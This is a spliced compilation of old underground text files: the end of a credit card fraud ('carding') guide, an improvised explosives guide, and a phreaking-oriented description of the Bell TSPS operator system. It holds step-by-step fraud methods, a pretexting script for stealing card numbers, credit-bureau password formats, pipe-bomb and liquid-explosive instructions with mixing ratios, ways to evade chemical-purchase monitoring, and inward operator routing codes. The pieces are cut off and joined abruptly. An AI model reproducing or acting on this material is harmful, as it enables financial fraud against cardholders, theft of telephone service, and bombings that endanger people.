SCHOOL, PARTIES, OR SOCIAL EVENTS. Not even to your best friends. ESPECIALLY

not to your best friends. They are the ones most likely to brag about you and

spread the word. This is the farthest thing from what you want. Keep it to

yourself, and if you must tell someone about it, either call Phone Sex, a

Bridge, or an Alaskan Operator. Those are your only choices, as no other carder

or phreak wants to hear about how good you actually are.



  FIFTH- I wouldn't advise making a bussiness out of this, either. Sure, if you

want to get a few dollars for things you order (and that you don't want

anymore) sell it and keep the money. But its purely asinine to take "orders"

from people for money. And even if you don't want money. Keep in mind that

Credit Fraud IS a felony, and getting caught violating US Federal Laws is not a

fun experience to go through. Do you want to go to jail for 10 years, and never

again be able to get a good job because Joey down the street wanted to pay $10

for a new skateboard that retails for $75?? Thats what I thought. Your whole

goal in life, as long as you participate in the Underground Arts, is to keep a

low profile.



VIII. Getting Credit Cards



     There are a number of ways through which you can get credit cards.



  FIRST- Go trashing. That is, go in back of a bank, department store (make

sure it is not in a mall!), or other store which accepts credit cards. When the

coast is clear, jump in their trash bin. Rummage around a bit. Having a look

out might prove to be wise. What you are looking for are carbons - the carbon

paper which the salesperson throws out after a purchase has been made. Remember

these? It is the device that guarentees you (a legit customer) get a receipt of

your credit card purchase, and also that the store gets a copy for record

keeping. Once you find these, (and making sure you don't rip them) put them in

a bag, pocket, whatever, and get somewhere safe. (home?) Hold them up to the

light, and copy down everything you think is important. Card Number, expiration

date, name, address, bank name, etc... Then BURN the carbons. This destroys all

evidence that you ever had them. From here, you are set. Order away!



   SECOND- If you have a friend that works in a store which performs credit

card transactions, you might save yourself the trouble of banana peals on your

head and ask him/her if they might not mind slipping the carbons into a bag

after they ring up a sale. (or have them copy everything down for you.)



  THIRD- You might try bullshitting people and getting their cards. You have to

be VERY good, and the person has to be VERY stupid for this to work. In my

mind, it is a waste of time, and almost never works. (Because people where I

live are smart, of course..) I am presenting this to you in case you live in a

society of morons. Exploit every area that you possibly can. The conversation

might go something like this:



YOU: "Hello, Mrs. Davis? This is Mr. Off from Security down at Citibank. We

have had a computer breakdown and no more of your VISA transactions can be

processed since we lost your credit card number. Do you think that you can give

me your number again, so I can re-enter it right now?"



Mrs. Davis: "Wait a minute, who is this again?"



YOU: "My name is Jack Off and I am from Citibank Security. (Explain whole

situation to her again )"



Mrs. Davis: "I don't know about this. Can I call you back at a number?"



YOU: "Sure. That's no problem. I understand your reluctance. Here... call me at

my office. Its 555-1212 (pay phone, loop, or bridge which you are at)"



Mrs. Davis: "Ok, bye!"



<CLICK>

<RING...>

YOU: "Hello? This is Jack Off's office, Citibank Security, may I help you?"



Mrs. Davis: "Oh, good. I was afraid you were a phony. Ok, my VISA is xxxx-

xxx-xxx-xxx... "



YOU: "Thank you. We will try to restore your credit limit as soon as possible.

Until then, please refrain from trying to purchase merchandise on your Citibank

Visa Card. Goodbye."



<CLICK>



Neat, huh?



  FOURTH- If are a really advanced Carder, you can get fancy and use a credit

card formula. Great, you're saying to yourself. GIMME GIMME GIMME! Not so

quick. Although several do exist, and I do have a couple of them, I am in a

situation in which I am unable to reveal it. If you are particularly smart and

intelligent, you can develope it yourself. Actually, it is not that hard if you

have the means. MAYBE if you are good at math....



  FIFTH- You may try to get credit cards from other people. (friends?) I

stronly recommend against this. Usually the cards you get from other people

have usually already been used and are either being watched or are already

dead.



  SIXTH- If you have access to a Credit Union, you can call and "pull" someone

else's account. (For instance, if you know someone's name and address, or

social security, you can take a look at all of their loans and credit cards. )







IX. Advanced "Carding" Techniques



     Please, people, I beg of you -- If you have not been carding for a year or

two (AT LEAST) do not read this information. It will only confuse you, and even

if you understand it, it will not work as it should unless you have the

experience you are lacking. So sit tight and practice with parts I-VIII.

PLEASE!



     If, perchance, you happen to have the experience necessary to read on,

then enjoy this. The following are simply a few details, hints, etc, that I

just left out of the original manuscript due to my horrendous memory. Add to it

if you like, and pass it a long. We all need to help each other if we are going

to survive. Also, the following are in no particular order except that which

they come to my head.



1) For a drop site, you can try to get fancy if need be. I have heard of empty

military huts being used as well as empty condos, empty houses whose owners are

on vacation, and about a zillion other stories. If you think you have come

across something new, think a plan up, think it over, and think it over again.

Make sure you have every step down so when you order, pick up, and make your

escape, there are no problems. Think about it . . . what harm does it do to

spend an hour making sure you didn't overlook something. It is a lot better

than going there and getting caught.



2) Sometimes the places you order from will have an online account with a

credit record bereau. (Such as TRW, CBI or Transunion) The horrifying fact is

that they can verify ONLINE ANY information that you give them. So, you're

busted, right? Wrong . . .

If this happens, there is nothing you can do unless you have a lot of power

with phones. Chances are, you don't. So play it cool and give an excuse to get

off the phone. Just try somewhere else. Also, if you don't do this right, you

will probably kill the credit card.





X. Credit Unions



     Credit Unions basically are databases that hold information of its

members. When you apply for a credit card, I think that the application to be a

member of a Credit Union is presented also. Since almost EVERY person who owns

a credit card has personal information in at least one of these services, then

there is no fooling he who has access to these services. Many times in your

carding career, you will run into a bussiness who has an online connection to

such unions. If you try to present false information they will catch you and

follow up with the appropriate actions. (That is, report the credit card you

said is yours as dead, call the authorities, etc, etc.)

     Two of the major Credit Bureaus in the United States are TRW and CBI. As

these two services hold large bases of information on its members (ie, every

credit card holder in America), many unauthorized personnel often wish to gain

access to them. They are accessed through a computer by calling a Bureau port

and entering authorization passwords.

     For CBI, the passwords are in the format of nnnllnnn-**, where n=a number

0-9; where l=a letter from a-z; and where *=any character.

     For TRW, the passwords are in the form of lllnnnnnnnlnl. (using the same

key as CBI.)

     As you can see from the length and complexity of these passwords, it is

literally impossible to hack them. (ie, hack in the sense guess them.) So you

are probably wondering how unauthorized persons gain access, huh? Well, we

either have inside information or we go trashing. Thats it.

     Right now, however, I am not going to go any further into the subject of

credit unions. Be aware that they exist, and they can help you as well as hurt

you if you don't know what you are doing. At a later date I plan on devoting an

entire file to the subject of credit unions, as I haven't seen an up-to-date

file in years.







Thats about all. I wish you all good luck, and may your adventures be safe and

fun-filled. And if I EVER catch any of you giving out the credit formula (once

you discover it..) I am going to personally fly over and kick your ass.

(remember- I have carded tickets around the country many times. There is

nothing to stop me from visiting YOUR town.. hahaha)



One final note -- VISA is planning on changing their credit formula within a

few years. So if you happen to be reading this many a year down the line, you

will most likely discover that some of this is no longer valid. DONT BLAME ME.

It was valid at the time when I compiled it.

Other Things to Do



1] Plane Tickets



     It is relatively easy to order plane tickets using a credit card nowadays.

And, for convenience, you can order over the phone. Well, look up your favorite

airline, call them, and present them with the situation. You would like 2

executive class tickets to Florida [ Ed. Note - If you live in Florida, make it

a trip to California ] round trip to be billed to your Visa Credit Card. Oh

sure, maam. My credit card number is <blank>. My expiration date is <blank>. My

Name is Joe Schmoe. I live at 223 Hard On Lane, Pubic Hair, PA. Oh, and maam,

could you PLEEAZE hold the tickets at the airport for me. I will present some

identification to pick them up there. Thank you.

     It is relatively easy to do this. But, there are a few catches.



          A.) Do NOT stay for any long period of time at any one place. After

              few days, the airline will catch on to what you have done. My

              suggestion is that you stay for only about 2 to 3 days. Or, if

              you really want to stay for a long time, get a one way ticket to

              wherever it is that you would like to go to. Stay however long

              you want to stay and take another 1 way ticket home.



          B.) If you plan on traveling around the country, catch one way

              tickets around from place to place. And please, USE DIFFERENT

              AIRLINES!



2] Motorcycles



     Again, you would be surprised at the amount of work (or lack of it)

required to aquire motorcycles on other people's credit cards. I believe you

can all see the advantages, so let us get down to the procedure. First, set up

an order under a corporate account. You can find these sometimes if you work in

a store that would use such cards. (Look over shoulders) Well, I will leave to

you the methods to come upon corporate account cards. Once you have them,

finish the procedure. Step 2 is to send an "employee" (yourself or a stupid

friend) to pick it up. Bring proper identification that was issued from the

corporation. (I suggest making your own -- Not very hard). Offer a Voice Mail

Box as your bussiness number. It is very common for a high level employee to be

absent from his desk. Use your imagination for the rest, and tidy it up to

perfect it.



3] Travelers Cheques



     OKAY, I will admit this is getting out of hand, but what the hell -- For

those of you very daring and in possession of a very good form of false

identification (Birth Certificate?), you can easily order some American Express

Traveler's Cheques for your travels around the world. The number to call is

1-800-777-7337. Using your American Express Credit Card, order some of these

"babies" in another name. (For a gift..) Have them delivered as you deem

appropriate. Enjoy them thouroughly.

[ Ed. Note: This number is active as of 12-20-88. I don't know if these offer

this service year round. Find out! ]

                          classified data.



     -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-





                            INTRODUCTION



I know of all of you phreaks, hackers, etc. out there are interested

in any kind of information that the public usually does not publicize.

This is why I have wrote this phile - to inform you. I also feel that

I should volunteer this information to PHUN because I have obtained

much useful information from that publication and others. I think that

anyone with good knowledge should teach it to their phriends because

we are becoming a dumb race due to the enlightened attitude of the

population from influences such as yuppies, geeks, skateboard freaks,

subliminal brainwashing, bloated bureaucrats, and lazy legislatures.

We must try to become free THINKING people so our brains do not atrophy.

Don't let any of the above influences brainwash you into a quivering

pathetic mass of gelatin like so many people are now. Use any

information from philes you read to benefit you and rid of the

bastards out to get you!!!



At any rate, lets get on with it...The field of explosives is a very

interesting one to study. It can be fun, and it can be dangerous at

the same time. One must exercise great caution when assembling any

type of explosive device since most are sensitive to jarring, rough

handling, friction, static, and other influences. THIS INCLUDES

MIXING ANY CHEMICALS OR EXPLOSIVES TOGETHER.



            DO NOT EVER MIX ANY EXPLOSIVE FORMULA TOGETHER WITH

           ANOTHER UNLESS YOU WANT YOUR BODY EVAPORATED OR AT THE

                   LEAST, LIMBS REMOVED OR EYES BLINDED.



If you are uncertain of an explosive formula you have found in an

anarchist book or on some BBS, don't make it. As a matter of fact,

don't trust to many philes you see and only believe the reputable

books such as "The Poor Man's James Bond I & II", the "CIA Black

Books", and army field manuals. I also ran across some new books

called "Kitchen Improvised Explosives", which can be had from a

radical book company called LOOMPANICS UNLIMITED P.O. Box 1197, Port

Townsend, WA 98368. They are also a very good source for information

but the procedures outlined require more lab apparatus.



It is also a good idea to take some chemistry classes. Take advantage

of chemistry in high school if you are still there. You can learn a lot

if you pay attention and read ahead of your teacher. Try to get on his

good side so he will let you perform "extracurricular activities" in

the school lab. You can learn a lot by doing experiments and you can

also have access to chemicals and expensive lab ware which I find is

necessary to safely make many explosive compounds. If you are out of

school, and you want to get serious about explosives, take a chemistry

class or two at your local college. Call your local Technical school

if you have one and ask them if they are offering any miners blasting

seminars in the future (yes these do exist). If not, call your local

bureau of mines and inquire. Some "social engineering" may be

necessary when talking to them though.



One should at least go to the local library and look for explosive

books and check the encyclopedias for "scratch the surface"

information. If you know a little about chemistry, get the book "The

Chemistry of Powder and Explosives" by Tenny L. Davis. You can obtain

journal footnotes from such books and do further research in "Chemical

Abstracts" and "The Journal of the American Chemical Society" along

with many others; all obtainable from a halfway decent college

library in the reference section.

             __________________________________________



                           EXPLOSIVE TYPES



Basically, there are two types - low and high. The low explosives are

chemical compounds such as black powder, flash powder, match head

powder, etc. These compounds do not necessarily explode but have more

of a burning characteristic. They will propagate into an explosion

when confined in a solid container such as a "pipe-bomb" so the gases

they produce can expand forcefully instead of burning away in the open

air. Black powder for instance detonates at about 300 meters per

second, which roughly means if you make a "train" or line of it 300

meters long, and detonate it with a blasting cap at one end of the

train, the chain reaction and decomposition of the whole train will

take one second. And black powder releases about 12000 PSI when confined

in nominal 2" water pipe with a wall thickness of 1/8" and detonated

with a No. 8 blasting cap (this is a standard size blasting cap that

coal miners and the military uses). Notice I said that it must be

detonated. You cannot just stick a wick in the pipe and light it because

more that likely it will only burn and make a big fire. I will talk more

about detonation later. 2,4,6-Trinitrotoluene (TNT) detonates at about

7400 meters per second when cast loaded into a container. TNT is a high

explosive and its subsequential confinement in a container is not as

important as with low explosives. High explosives are chemical compounds

that will explode regardless of containment. You could lay a big pile

of TNT on the ground, lay a blasting cap on top of it, light the wick,

and the whole mess will still explode. High explosives undergo a

chemical reaction of decomposition in less that a millionth of a second.

All of the energy is released instantaneously. Low explosives, such as

black powder have more of a burning characteristic. High explosives not

only detonate much quicker, but also release more energy. TNT releases

about 4.24 million PSI and the military explosive C-4 releases about 5.7

million PSI and detonates at 8100 meters per second!

            _____________________________________________



                              DETONATION



Most high explosives are not capable of detonating without being set off

or initiated with another explosion. This is done with the help of those

neat little goodies called blasting caps. They contain medium to high

explosives also, but their chemical composition(s) are unstable and will

detonate when fire or spark is introduced to them. You may ask then why

not just use blasting cap explosive instead of regular high explosives.

Well, blasting cap materials are VERY sensitive to shock, friction, etc.

and are also not as efficient as regular high explosives.



Anyway, the blasting cap is usually placed in the high explosive in a

well dug in the high explosive. An example would be like this in a pipe

bomb:



                                     _______ Blasting cap

                                    /

                               !-- * --!

                               !   *   !

                               !   *   !

                               !       !_____ Pipe bomb

                               !       !

                               !       !

                               !       !

                               !       !

                               !-------!





                     (please excuse the ASCII drawing)





When the cap is detonated, the explosive wave it generates is directed

downward and detonates the high explosive in a "chain reaction".

This is why the bottom of the explosive container should be placed on

the target. The peak of the propagated explosive wave will be at the

bottom of the explosive charge...



At any rate, I do not suggest that one attempts to manufacture blasting

caps without knowledge in explosive handling safety and also the proper

laboratory procedures when making the blasting cap explosive itself.



I have made over 300 blasting caps without an accident. I also take very

careful precautions before assembling the caps and I have a properly

equipped laboratory to synthesize the explosive material. I always work

in a controlled environment with accurate measuring equipment for any

explosive experiment I partake in. It is necessary to work under a lab

fume hood to vent any toxic gases produced during experiments. It is also

a good idea to ground yourself and your work area so static electricity

doesn't wreak havoc and blow your chemical up in your face.



IT IS GOSPEL TO FOLLOW DIRECTIONS WHEN DOING ANY EXPERIMENT. ESPECIALLY

WITH EXPLOSIVES. Outline your explosive production procedure before

proceeding with any experiment.



Refer to literature at your local library concerning blasting cap mfg.

before you attempt to make them. The book I mentioned "The Chemistry of

Powder and Explosives" covers the subject very well. There are also some

good books available from Paladin Press on explosive manufacture and the

blasting cap manufacture.



It is possible to create blasting caps in a "kitchen" type environment,

but I do not recommend it because of the dangers involved when making

the explosive components. Many of the starting materials are corrosive

and toxic. Blasting cap explosives are also VERY sensitive. More so than

nitroglycerine in some cases. For instance, Lead azide, the most popular

blasting cap explosive today, when synthesized improperly, can grow into

crystals in the starting agent solution and spontaneously explode just

because of improper stirring and/or cooling. Very easy mistake to do.

Mercury fulminate, one of the cheapest and easiest to synthesize,

produces toxic gases when synthesizing. When the finished product is dry,

it is sensitive to a 2cm drop of a 5 lb. weight. THAT IS SENSITIVE!



ALTERNATIVE:



After all of this negative talk of blasting caps leaves much to be

desired. But there is an alternative to using blasting caps if one has

access to firecrackers such as M-80's, M-100's, M-200's, cherry bombs,

Maroons, etc. These little bombs themselves are sufficient enough to

detonate many high explosives. All of the "nitro" compounds will

detonate with one of these firecrackers. Their use would be the same

as the blasting cap - inserted in a little "well" made in the explosive

charge, sealing off, and their fuse ignited accordingly.



            ____________________________________________



                        MAIN EXPLOSIVE CHARGE



This is the big working explosive. The one that does the big damage.

It should be handled with the same precautions as blasting caps, but

in many cases, can be as safe as handling fertilizer.



Some examples of common high explosives are ditching dynamite, gelatin

dynamite, ANFO (ammonium nitrate fertilizer/fuel oil), TNT, PETN, RDX,

military plastics, and even smokeless powder.



These explosives are easily made in some cases, and dangerous at the

same time. Since it is beyond the scope of this article, I must refer

everybody to your local library, the books I have mentioned, or most of

the "unusual" book publishers. Just do research in all possible material

before grabbing a book and running out, buying the chemicals, and

throwing stuff together. Get yourself a few of the "black-books", the

"Poor Man's James Bond volumes", etc. and compare them with each other.

Don't trust any unheard of publishers or books.



It goes the same for the main charge; if one doesn't have access to the

necessary chemicals, one can improvise. For instance the smokeless

powders available from gunsmith's and reloading shops contain high-

explosives such as nitrocellulose and nitroglycerine. They are called

double based propellants. An example is made by Hercules Powder co.

called "Bullseye" pistol propellant. It contains:



 48% Nitroglycerine

 50% Nitrocellulose

  2% Flash suppressants, stabilizers, etc.



It will detonate at about 7200 meters/sec. when firmly packed in 2 inch

wide, schedule 40 hardened steel pipe. It detonates with 2,000,000 PSI

also. This should suffice for many operations.



I myself placed 1 1/2 pounds of the powder in a three pound coffee can

and detonated it with an M-80 firecracker and it left a ditch in hard

packed clay-soil about 2 feet deep and 3 feet wide! It was simply placed

on the ground with the bottom of the can down. The blast was plainly

heard indoors 1 mile away! Please if you attempt such a blast, make sure

you give yourself ample time to get at least 300 yards away and don't

detonate it near any buildings within 50-75 yards because the air-blast

will possibly crack their windows. I usually use a lit cigarette placed

on the fuse of the cap or firecracker. This will give you about 10 min.

delay depending on the temperature and wind conditions. Packing the

cigarette will give a longer delay.



Another good explosive, if you prefer a liquid explosive is a mixture of

Nitromethane and amine based compounds such as aniline, ethylenediamine,

and for anyone that can't obtain the above chemicals, regular household

ammonia will work as long as it is the clear non-detergent brand.

The Nitromethane can be had from any "speed-shop" or race car parts

supplier. It usually runs about $20 to $30 bucks a gallon. Simply mix the

two liquids: 96% nitromethane and 4% ammonia (by weight). This explosive

has the disadvantage of being somewhat insensitive. You need at least

a No. 8 blasting cap to detonate it. It only need be confined in any kind

of capped bottle and the blasting cap inserted in the neck. The blasting

cap should be dipped in wax before immersion in the liquid explosive.

Some Nitromethane manufactures add a indicator dye that turns purple when

the liquid becomes dangerously explosive. So, when you mix your ammonia

with the Nitromethane and the solution turns purple, you know that you

have done well!

            ________________________________________



                 OBTAINING CHEMICALS AND LAB WARE



Getting your chemicals and lab ware can present a problem in some cases.

In order to order laboratory chemicals, one must be a company, or

try to prove that you are a company. Most suppliers don't like to sell

to individuals in fear of clandestine drug and explosive manufacture.

Those same companies also can be fooled easily with homemade letterhead

also. For those of you with laser printers, the sky is the limit. If

you don't have a laser printer, you should visit your local print shop.

First, simply call the chemical companies and request for a catalog.

You must get on the phone and say something on the order of:

"Hello...this is C.B.G. Water Treatment Corp., may I speak to sales

please? I would like to order your most recent catalog..."

When you get catalogs from different companies, compare their prices

and shipping charges. Make sure you don't order a set of chemicals

where it is obvious you are making something you don't want them to know

you are making. A suspicious order would be Nitric & Sulfuric acid and

glycerine. This would be obvious that you are going to produce nitro-

glycerine. Spread out your orders and orders between companies. Also

be careful of watched chemicals. The drug enforcement agency watches

certain orders for certain chemicals. They usually say something on the

order of under the listing of the chemical entry in the catalog "only

sold to established institutions." It just so happens that certain

explosive synthesis requires the chemicals as some illicit drug

production.



Go to your local library in the reference section. Get the THOMAS REGISTER

It is a set of books that list addresses of industrial suppliers. Look

under chemicals for addresses.



I do know of one company called Emerald City Chemical in Washington.

They only require that you be at least 18 years of age. No letterhead

necessary.



I suggest staying away from Fisher Scientific, Seargent Welch, Sigma &

Aldrich Chemical companies because they are either expensive, only sell

to schools, or watch for illegal or suspicious chemical orders. I noticed

that a lot of you phreaks out there live in New York; so stay away from

City Chemical Co. I was informed that they closely watch their customers

also.



Don't make some letterhead for Jo Blow's Sewing Machine Repair and order

complicated chemicals like 2,3,7,8-tetrachlorodibenzo-p-dioxin, bis-2-

ethylhexy-diadipate, 3,4-diaminofurazain, or pharmecitucal type chemicals

or any kind of chemical that looks like a foreign language. It looks

VERY suspicious and your address will be forwarded to your local FBI or

DEA office pronto. Nowadays you really got to watch what you order

thanks to our bleeding heart liberals worrying about kids blowing their

hands off trying to make firecrackers, or folks making controlled drugs in

their basements.

            ________________________________________



                            CONCLUSION



I hope this information is of some use to you. Just remember that it is

a federal offense to manufacture and transport explosives or explosive

devices without a B.A.T.F. licence.



Also keep in mind that if you do decide to make yourself some bombs,

just remember NOT TO TELL ANYONE! If you tell someone, that is just the

added risk of getting caught because your "buddie" was a stool pigeon.

BELIEVE ME - chances are if you tell someone, others will find out from

gossip and you will be the alias "mad bomber" of your town. If someone

happens to see any lab equipment or if your neighbors smell any strange

chemical smells around your home, they might even think you are making

drugs, so be careful. If you tell your friends of your activities, don't

be surprised if you see a gunmetal grey Dodge Diplomat with a dozen

antennas protruding from it sitting across the street with a guy in it

watching your house with a spotting scope...



DO NOT SELL explosives to ANYONE without a licence. If they get caught,

the feds will plea-bargan with them and find out where they got the

bombs and of course your buddie will tell them so he gets a reduced

sentence. They WILL get a search warrant with no problem and proceed

to ransack your premises. I know of a person that was in a similar

situation. He didn't have any explosives in his house, but they seized

his chemicals because of the complaint filed. Subsequently, the feds

kept up pretty good surveillance on him for quite a while.



Use this information with caution and don't blow yourself up!

1.0 Introduction

================



The purpose of this file is discuss and describe the general system

architecture and processing of certain calls handled in a Traffic Service

Position System (TSPS) No. 1B office.  From here after, any reference to the

anacronym - TSPS, will be used to describe the Traffic Service Position System

1B.  Wheras TSPS processes a wide variety of call types (listed below), this

file will deal primarily with only a few types which I feel to be of special

interest and importance to the phreak/hack community.  Future files on TSPS

will continue to expand upon the information presented here, and will discuss

additional call types and processing.



The types of calls, elected to be discussed in this file will fall primarily

within the three following categories:



        1)  Coin Station Calls (Payphone) and ACTS call processing.

        2)  Calling Card Service and Billed Number Screening.

        3)  Busy Line Verification

4.0 General Overview of Call Types

==================================



All call processing can be broadly thought of as the processing of a service

request (by an operator or a customer) thru connection, talking state, and

disconnection.  Call types can be classified into the following two major

groups: (Although no definite line can be drawn, in that the groups often

overlap each other.)



4.1  Customer Originated Calls

==============================



The first category of calls are those which can be classified as customer

originated. In an effort to keep with the three main types discussed here,

some of the call types listed will not be explained.



        4.1.1) 1+ Calls

        ===============

         - DDD calls

         - Calls with ANIF or ONI

         - H/M calls

         - CAMA calls

         - 900 Dial Line Service (DLS)..."Dial a Vote"

         - NonCoin transfers from offices with out billing equipment

         - Coin Calls...Discussed later in greater detail



        4.1.2)  0+ Calls

        ================

         - Calling Card Service (CCS) Calls

         - Billed Number Screening (BNS) Calls

         - Originating Station Treatment (OST)..Third Party Billing, Collect..



        4.1.3)  0- Calls

        ================

         - OPCR ...Standard RBOC(or Equivalent) "0" operator



        4.1.4)  International Call Handling (ICH) ...Overseas Calls

        ===========================================================



        4.1.5)  Automated Quotation Service and H/M calls

        =================================================





4.2  Operator Originated

========================



The second category of calls handled by TSPS are operator originated, and are

normally only initiated after a response to a customers request.  These calls

are of a nature that require operator intervention in order to complete.

Examples: BLV/EMG INT, collect, third party billing...



        4.2.1)  Special Operator Service Traffic (SOST)

        ===============================================

        - These include calls which must be transferred to a SOST switchboard

          before they can be processed. Examples: Conferences, Appointment,

          Mobile...



        4.2.2)  Delayed Calls

        =====================



        4.2.3)  Operator Service Calls

        ==============================

         - Customer/ Operator requested Rate and Route information ( RQS )



        4.2.4)  CAMA Transfer Calls

        ===========================

         - Includes ANIF and ONI

         - Transfers from areas without billing equipment



        4.2.5)  Busy Line Verification (BLV)

        ====================================

         - The Busy Line Verification allows a TSPS operator to process a

           customers request for a confirmation of a repeatedly busy line.

           This service is used in conjunction with Emergency Interrupts and

           will be discussed later in more detail.



        4.2.6)  Inward Calls

        ====================

         - An inward call requires a TSPS operator to provide services which

           the customers originating operator is not able to provide.  Ex:

           connection to a hard to reach number, BLV/EMG INT, CCS billing

           validation...An inward call can be originated with any of the

           following arrival codes:



                - 121  : NonCoin code...standard inward connection

                - 1150 : Coin code

                - 1155 : Noncoin with T&C code

                - 1160 : TSPS operator assisted inward CCS validation

                - 1161 : Automated inward CCS validation for non TSPS operator

                         with DTMF touch tone signaling.

                - 1162 : Automated inward CCS validation for non TSPS operator

                         with MF signaling.



                - Examples of the above codes:

                - KP+NPA+121+ST gets inward operator in NPA selected with only

                  INWD key illuminated, indicating call connected to position

                  in an inward call.



                - KP+1161+ST gets automated CCS validation that responds to

                  DTMF tones.









5.0  General Call Processing for Coin Stations and CCS

======================================================



This section will deal with the processing that occurs during all customer

initiated calls, and can be applied to both Coin and CCS calls.  The following

processes are presented in the order which they would normally be handled.



        5.1)  Trunk Seizure

        ===================

         - When a local office seizes a trunk in response to a customer request

           (i.e.- A customer has picked up the phone, placing it off-hook),

           current flows thru the circuit, changing the state of the ferrods

           (i.e.- scan points ) from an on-hook to an off-hook position.  When

           this change is determined by the PTS (Position and Trunk Scanner) at

           the RTA (Remote Trunk Arrangement) to be an actual off-hook

           transition, and not merely a flash (tapped switch hook), it is taken

           as a request for service.



        5.2)  Digit Reception

        =====================

         - After a trunk is seized the local office sends the called and

           calling number to the TSPS by means of MF pulsing.  A Base Remote

           Trunk is connect to the MF receiver, which then proceeds to outpulse

           the MF digits.  The digits are received and registered on ferrods by

           the PTA in the order in which they were received.  The called number

           is the number dialed by the customer and consists of either 7 or 10

           digits; the calling number is determined by the local office ANI

           equipment or by ONI, in case of ANIF.



        5.3)  Bridging a Position

         =========================

          - An idle occupied position is then bridged onto the call by a

            connection to the TSPS.  If operator service is required after

            connection to a position, the operator is prompted by a "zip" tone,

            and is alerted by a KIND OF CALL lamp, which provides information

            as to whether the call is coin, noncoin, 0+, 0-...If no operator

            service is required, the MF digits are outpulsed along the

            appropriate routing.



        5.4)  Call Connection

        =====================

         - If operator action was needed, upon the operators disconnect of the

           line (position released), the network connection between the the

           TSPS trunk and the base remote trunk is severed. The established

           through connection is now placed in a call floating (talking) state

           until disconnect.



        5.5)  Call Disconnection

        ========================

        - Both ends of a connected call are monitored for an off-hook state

          change, which upon indication,must occur long enough to be recognized

          as an actual disconnect (and not merely a flash...).  Another manner

          of disconnect is from a called party Time Released Disconnect (TRD),

          which is employed to limit billed party liability and release network

          connections.  Example: A customer requests a disconnect after x number

          of minutes, or after $x.xx.  The final action in a disconnect is to

          return the TSPS trunk to an idle position, which then awaits

          recognition of another service request.



        5.6)  AMA Data Accumulation and Reception

        =========================================


           registered, and prepared for billing.  The following is just some

6.0  Coin Station Calls and ACTS Processing

==========================================



In general, coin station calls can be divided into 1+, 0+ and 0- originated

calls, not including 0+ and 0- CCS calls which will be discussed later in this

file.  All calls falling into these categories go through the following basic

operations, many of which were described in section 5 of this file. (The []

indicate operations that may or may not be present, depending on the type of

call placed)



        - 1) Trunk Seizure

        - 2) Digit Reception

        - 3) Bridging a Position [and Coin Detection and Announcement (CDA)]

        - 4) [Operation Action and] Digit Outpulsing.

        - 5) Talking Connection

        - 6) Call Disconnect

        - 7) AMA Processing







6.1  Automated Call Processing

==============================



All coin station calls requiring coin input from the customer are handled by

the Automated Toll Services (ACTS) which is implemented by the Station

Signaling and Announcement Subsystem (SSAS).  The SSAS automates the initial

contact on most 1+ (station paid) toll calls, by transmitting an announcement

requesting the initial deposit from the customer, and counting the deposits.

If an unusual delay occurs during the coin deposit period, the SSAS will prompt

the user for the remaining deposit needed to complete the call.  Upon

completion of sufficient deposit, SSAS provides an acknowledgement announcement

thanking the customer, and then causes the outpulsing of the called digits to

be handled by the Stored Program Control (SPC).  This delay in outpulsing

prevents free, short duration messages and keeps the audible ring of the called

party from interfering with coin detection signals.  Any customer over-deposit

is automatically credited towards overtime charges.  SSAS can accommodate

initial periods of up to 6 minutes, at the end of which the local office rate

schedule is accessed and announcement may or may not notify the customer of

the end of initial period.



 6.2  Operator Intervention

===========================



If at any time during the coin collection period, a customer fails to deposit

the sufficient funds (within a specified time period), or a flash is registered

on the switchhook, a TSPS operator will be bridged onto the call.  In this

event SSAS will monitor the coin deposits via a type I CDA circuit; however all

automated coin announcements will be suppressed.  All calls originating from

postpay coin stations must initially be handled by an operator, in that postpay

coin stations lack coin return equipment, and cannot return deposited coins

(i.e.- Postpay stations do not have a coin hopper, only a coin box).  This

physical restriction requires the operator to verify that the correct party has

been reached (and goes off-hook), before the customer makes any deposit.  Upon

verification, a type II CDA circuit is connected to count and monitor the coin

deposits.  This type of circuit is also connected whenever there is a large

amount of change associated with the call.  This is because the coin hoppers on

standard payphones, can only handle limited deposits.  If a deposit exceeds the

hopper limit, an operator will be bridged to the circuit to make a series of

partial collections.





6.3  SSAS Fully Automatic Criteria

==================================



The SSAS fully automates 1+ coin station calls (ACTS) if and only if all of the

following conditions are met.  Failure to meet any of these conditions results

in operator intervention.



        6.3.1)  ACTS Converted Trunk Group

        ==================================

        - Coin Stations must be converted to provide DTMF coin deposit signals

          that the CDA can recognize.



        6.3.2)  Machine Ratable

        =======================

        - The TSPS must receive sufficient rating information; failure to do so

          will result in operator intervention.



        6.3.3)  Successful ANI

        ======================

        - If ANIF or the call is ONI, an operator must be added to the circuit

          to record the calling number.



        6.3.4  Cannot Be a Postpay Station

        ==================================

        - See previous explanation of postpay stations (6.2).



        6.3.5  Cannot Have Large Charges

        ================================

         - See previous explanation (6.2).





6.4  Fraud Detection and Prevention

==================================



If a calling customer goes on-hook (hangs up), at the end of a conversation and

charges are still due, TSPS automatically sends a ringback signal to that

station in the attempt to get the customer to pick up the phone.  If the

calling party answers, an ACTS overtime charge message is made requesting the

customer to deposit the remaining amount due.  At any time during this message,

an operator may be connected to the circuit and harass the customer for payment

If however 5 rings with a 4 second interval occur without an off-hook state

change, TSPS assumes a walkaway, and a registered traffic counter is flagged,

a walkaway bit set, and the amount due is all registered as AMA data.



Whenever the called party is off-hook, ACTS is susceptible to generated coin

signals (Red Box Tones).  In an attempt to prevent this fraud, a special type

II CDA is employed: Two-wire trunks are isolated between forward and back party

to monitor coin deposits.  The talking path maintains conversation by being

routed through the type II CDA.  When coin signals are detected, the SSAS

informs TSPS that a called party fraud is suspected.  If more then one

detection occurs on one call, TSPS flags a fraud indicator on the calls AMA

record. NOTE:A trunk group may or may not detect and/or record this information

depending on office criteria.









7.0  Calling Card Service and Billed Number Service

===================================================



I am assuming that everyone reading this file has at least some concept of what

a calling card is and how it would be utilized from a local office. The CCS and
BNS services are implemented in TSPS by CCIS hardware, SSAS and several

processing programs that will not be discussed in this file (ABEGN, ACALL,

ASEQ...)  The CCS and BNS together provide for the customer an automated credit

card calling option that was initially implemented as an alternative to third

party billing, collect and large change calls.



In order for the CCS and BNS to function, they require that each TSPS becomes

a node on the SPC network, which then allows access to a nationwide database of

Billing Validation Applications (BVA).  The BVA currently consists of nodes

which are connected by CCIS, and are in turn made up of individual Billing

Validation Files (BVF).  A BVF is a file of data that is needed by the SPC and

associated database software to process queries about the data.  Each TSPS is

integrated into the SPC network and uses the CCIS direct signaling to access

